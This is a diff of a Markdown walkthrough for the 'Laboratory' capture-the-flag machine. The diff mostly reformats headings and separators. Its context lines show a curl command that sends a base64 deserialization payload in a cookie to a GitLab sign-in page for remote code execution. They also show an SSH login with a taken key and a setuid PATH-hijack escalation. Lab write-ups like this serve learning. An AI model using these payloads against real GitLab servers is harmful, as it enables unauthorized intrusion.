@@ -19,7 +19,10 @@ tags:
 
 Laboratory is rather an interesting box that is about exploiting a gitlab instance vulnerable with an LFI which can be used to leak a secret that can be used to craft an authenticated RCE payload. 
 
-###### 
+
+<h1>Laboratory</h1>
+<h3>Difficulty: easy, rating: 7/10</h3>
+
 
 <h4> Initial foothold </h4>
 
@@ -181,7 +184,6 @@ payload='BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmF
 curl http://git.laboratory.htb/users/sign_in -b "experimentation_subject_id=$payload" -k 
 ```
 which opens up a shell as a `git` user.
-#################
 
 <h4> User </h4>
 
@@ -203,14 +205,13 @@ ssh -i id_rsa dexter@laboratory.htb
 ```
 
 which lands us a shell as dexter, and we find the user.txt as well.
-######
 
 <h4> priviledge escalation </h4>
 
 
 Pirviledge escalation was easy as it gets, there's  a setuid executable that executes "chmod" without specifing a direct path to it. 
 
-###########
+
 <h5> Enumeration </h5>:
 
 ```bash
